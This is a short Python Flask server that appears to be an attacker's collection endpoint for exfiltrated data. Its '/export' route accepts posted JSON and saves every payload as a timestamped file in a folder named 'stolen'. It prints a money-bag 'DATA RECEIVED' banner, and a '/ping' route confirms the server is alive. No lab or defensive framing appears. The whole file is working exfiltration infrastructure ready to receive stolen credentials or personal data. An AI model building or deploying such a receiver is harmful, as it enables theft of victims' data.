from flask import Flask, request, jsonify
import json
import time
import os
from datetime import datetime

app = Flask(__name__)

if not os.path.exists('stolen'):
    os.makedirs('stolen')

@app.route('/export', methods=['POST'])
def export():
    data = request.json
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"stolen_{timestamp}.json"
    with open(os.path.join('stolen', filename), 'w') as f:
        json.dump(data, f, indent=2)
    print(f"💰 DATA RECEIVED")
    return jsonify({'status': 'ok'})

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'alive'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)